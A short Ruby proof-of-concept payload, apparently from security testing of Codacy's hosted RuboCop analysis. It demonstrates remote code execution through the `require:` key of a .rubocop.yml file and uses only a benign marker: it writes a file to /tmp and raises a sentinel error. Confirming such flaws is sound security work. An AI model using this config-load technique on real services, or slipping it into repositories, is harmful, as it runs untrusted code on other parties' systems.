# PoC payload — benign marker only. Loaded by RuboCop via `require:` (Kernel#require) at config-load.
File.write("/tmp/codacy-rubocop-rce-confirmed.txt", "RCE confirmed via .rubocop.yml require: #{__FILE__}\n")
# Throw a sentinel to prove our Ruby executed (RuboCop surfaces require errors in its output).
raise "CODEX_RCE_RUBOCOP_PROOF_#{__FILE__}_marker_written_/tmp/codacy-rubocop-rce-confirmed.txt"
